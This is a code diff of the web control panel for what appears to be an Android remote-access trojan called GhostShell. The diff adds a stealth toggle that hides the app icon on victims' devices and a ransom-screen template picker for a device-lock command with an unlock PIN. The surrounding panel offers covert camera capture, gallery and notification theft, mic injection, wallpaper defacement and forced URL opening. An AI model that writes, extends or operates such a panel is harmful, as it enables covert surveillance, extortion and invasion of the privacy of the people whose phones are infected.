@@ -97,6 +97,12 @@
         .btn.active { border-color: var(--danger); color: var(--danger); }
         .btn.active i { color: var(--danger); }
         
+        /* STEALTH TOGGLE STYLE */
+        .btn.stealth-on { border-color: var(--primary); color: var(--primary); box-shadow: 0 0 10px var(--primary-glow); }
+        .btn.stealth-on i { color: var(--primary); opacity: 1; }
+        .status-badge { position: absolute; top: 5px; right: 5px; font-size: 0.6rem; padding: 2px 4px; background: #000; border: 1px solid #333; border-radius: 2px;}
+        .stealth-on .status-badge { color: var(--primary); border-color: var(--primary); }
+        
         button.action-btn { 
             background: transparent; color: var(--primary); font-weight: bold; border: 1px solid var(--primary); 
             padding: 8px 12px; border-radius: 2px; cursor: pointer; transition: 0.2s; text-transform: uppercase;
@@ -229,11 +235,18 @@
         if(!myUid) location.href = '/';
         document.getElementById('user-display').innerText = myUid;
 
-        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", flash = false, mediaRecorder, audioChunks = [];
+        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", flash = false, isStealth = false, mediaRecorder, audioChunks = [];
 
         async function cmd(c, b={}) {
             if(!selId) return;
             await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
+        }
+
+        function toggleStealth(btn) {
+            isStealth = !isStealth;
+            cmd(isStealth ? 'hide_icon' : 'show_icon');
+            btn.classList.toggle('stealth-on');
+            btn.querySelector('.status-badge').innerText = isStealth ? 'ON' : 'OFF';
         }
 
         function logout() { localStorage.removeItem('ghost_uid'); location.href = '/'; }
@@ -263,8 +276,21 @@
                 f.innerHTML = `<button class="action-btn" onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY PAYLOAD</button>`;
                 return;
             } else if(t === 'toast') {
-                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">System Message:</p><textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\\nYour data is being encrypted.</textarea><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Unlock PIN:</p><input id="lpin" value="1337" style="text-align:center; font-size:1.5rem; letter-spacing: 5px;">`;
-                f.innerHTML = `<button class="action-btn red" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>`;
+                b.innerHTML = `
+                    <p style="color:var(--dim); margin-bottom:5px;">Ransom Template:</p>
+                    <select id="ltpl" style="background:#0a0a0a; border:1px solid #333; color:var(--primary); width:100%; padding:10px; margin-bottom:15px; outline:none;">
+                        <option value="lock">DEFAULT (STANDARD)</option>
+                        <option value="lockv2">GHOSTSHELL RANSOM V.2 (GLITCH)</option>
+                    </select>
+                    <p style="color:var(--dim); margin-bottom:5px;">System Message:</p>
+                    <textarea id="lmsg" style="height:100px;">SYSTEM_CRITICAL_ERROR\nYour data is being encrypted.</textarea>
+                    <p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Unlock PIN:</p>
+                    <input id="lpin" value="1337" style="text-align:center; font-size:1.5rem; letter-spacing: 5px;">
+                `;
+                f.innerHTML = `
+                    <button class="action-btn red" onclick="cmd(document.getElementById('ltpl').value + ' ' + document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button>
+                    <button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>
+                `;
                 return;
             } else if(t === 'vibrate') {
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
@@ -352,7 +378,12 @@
                 b.innerHTML = `<div class="gal-grid">${d.gallery.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.6rem; margin-top:5px; color:var(--dim); word-break:break-all;">${x.name}</p></div>`).join('')}</div>`;
                 f.innerHTML = `<div style="display:flex; justify-content:space-between; width:100%; align-items:center;"><button class="action-btn" onclick="cmd('gallery back')"><i class="fas fa-chevron-left"></i></button><span style="color:var(--primary); font-weight:bold; font-size:0.9rem;">PAGE: ${d.gallery.page}</span><button class="action-btn" onclick="cmd('gallery next')"><i class="fas fa-chevron-right"></i></button></div>`;
             } else if(curMod.includes('pic')) {
-                b.innerHTML = `<div style="text-align:center;"><img src="${d.media.is_direct?'data:image/jpeg;base64,'+d.media.last_img:'/captured_images/'+d.media.last_img}" style="width:100%; max-width: 500px; border-radius:2px; border:1px solid var(--primary); box-shadow:0 0 15px rgba(0,255,51,0.2);"></div>`;
+                const media = d.media;
+                if(media.status === 'done' && media.last_img) {
+                    b.innerHTML = `<div style="text-align:center;"><img src="/captured_images/${media.last_img}?t=${Date.now()}" style="width:100%; max-width: 500px; border-radius:2px; border:1px solid var(--primary); box-shadow:0 0 15px rgba(0,255,51,0.2);"></div>`;
+                } else {
+                    b.innerHTML = `<div style="color:var(--primary)">STATUS: ${media.status || 'CAPTURING...'}</div>`;
+                }
             } else if(curMod === 'notifications') {
                 b.innerHTML = `<div class="table-responsive"><table><tr><th>Source</th><th>Content</th></tr>${d.notifications.map(n=>`<tr><td style="color:var(--primary); font-size:0.8rem;">${n.packageName}</td><td><b style="color:var(--text)">${n.title}</b><br><span style="color:var(--dim)">${n.text}</span></td></tr>`).join('')}</table></div>`;
                 f.innerHTML = `<button class="action-btn" style="width:100%" onclick="cmd('getnotifications')">REFRESH DATA</button>`;
@@ -401,10 +432,14 @@
                 {id:'apps', i:'fa-box-archive', l:'PACKAGES'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                 {id:'vibrate', i:'fa-wave-square', l:'VIBRATE'}, {id:'voice', i:'fa-microphone-lines', l:'MIC INJECT'},
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
+                {id:'stealth', i:'fa-eye-slash', l:'STEALTH', type:'stealth'},
                 {id:'setwallpaper', i:'fa-image', l:'DEFACE WP'}, {id:'toast', i:'fa-lock', l:'RANSOM'},
                 {id:'open_url', i:'fa-globe', l:'FORCE URL'}
             ];
-            document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
+            document.getElementById('main-grid').innerHTML = btns.map(b=>{
+                if(b.type === 'stealth') return `<div class="btn ${isStealth?'stealth-on':''}" onclick="toggleStealth(this)"><span class="status-badge">${isStealth?'ON':'OFF'}</span><i class="fas ${b.i}"></i>${b.l}</div>`;
+                return `<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`;
+            }).join('');
         }
         poll();
     </script>
